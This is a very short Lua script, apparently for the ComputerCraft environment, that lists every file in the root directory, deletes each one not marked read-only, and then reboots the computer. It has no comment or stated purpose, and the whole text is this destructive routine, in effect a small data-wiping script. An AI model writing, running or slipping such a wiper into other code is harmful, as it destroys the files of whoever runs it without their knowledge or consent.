files = fs.list("")

for i,v in pairs(files) do
    if fs.attributes(v).isReadOnly==false then
        fs.delete(v)
    end
end

os.reboot()